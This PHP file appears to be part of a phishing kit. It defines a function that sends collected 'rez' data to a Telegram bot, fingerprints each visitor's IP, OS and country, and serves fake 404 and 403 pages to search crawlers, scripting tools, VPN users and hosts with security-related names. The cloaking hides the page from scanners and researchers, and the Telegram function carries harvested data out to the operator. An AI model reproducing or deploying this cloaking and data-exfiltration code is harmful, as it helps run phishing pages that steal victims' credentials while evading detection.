<?php

$str = rand();
$randString = md5($str);
$randStringC = md5($str + 8);
$os = get_user_os();
$ip = get_user_ip() ;
$code = get_user_countrycode();



    // function to send to telegram
function sendTelegram($rezdata) {

    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    

    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


    
    function get_user_ip()
    {
        return  $_SERVER['REMOTE_ADDR'];
    }

    function get_user_os() { 
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $os_platform    =   "Unknown OS Platform";
        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );
        foreach ($os_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }   
        return $os_platform;
    }
    
    function get_user_browser() {
        $user_agent     = $_SERVER['HTTP_USER_AGENT'];
        $browser        =   "Unknown Browser";
        $browser_array  =   array(
            '/msie/i'       =>  'Internet Explorer',
            '/firefox/i'    =>  'Firefox',
            '/safari/i'     =>  'Safari',
            '/chrome/i'     =>  'Chrome',
            '/opera/i'      =>  'Opera',
            '/netscape/i'   =>  'Netscape',
            '/maxthon/i'    =>  'Maxthon',
            '/konqueror/i'  =>  'Konqueror',
            '/mobile/i'     =>  'Handheld Browser'
        );
        foreach ($browser_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                $browser    =   $value;
            }
        }
        return $browser;
    }
    
// User agent validation
$blocked_agents = array('libwww-perl', 'PHP', 'Ruby', 'Python-requests', 'wget', 'cURL', 'Powershell', 'Perl', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider', 'google', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'Googlebot', 'bingbot', 'PycURL', 'facebookexternalhit', 'curl', 'wget', 'libwww', 'python-requests', 'httpie', 'java', 'powershell', 'perl', 'ruby', 'php', 'bot', 'crawler', 'spider'); // Add your blocked user agents
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($blocked_agents as $agent) {
    if (strpos($user_agent, $agent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

// Blocked hostnames
$blocked_words = array('ransomware', 'ddos', 'trojan', 'virus', 'worm', 'backdoor', 'rootkit', 'bad', 'hacker', 'spam'); // Add your blocked words
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
foreach ($blocked_words as $word) {
    if (strpos($host, $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit();
    }
}

if($ip == "127.0.0.1") {
}else{
    $url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    $result = $resp;
    if($result == "Y") {
        $file = fopen("proxy-block.txt","a");
        $message = $ip."\n";
        fwrite($file, $message);
        fclose($file);
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip (Detect by Proxy/VPN)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
    }
}


function get_user_countrycode() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
        if ($details && $details->geoplugin_countryCode != null) {
            $countrycode = $details->geoplugin_countryCode;
        }
    return $countrycode;
}

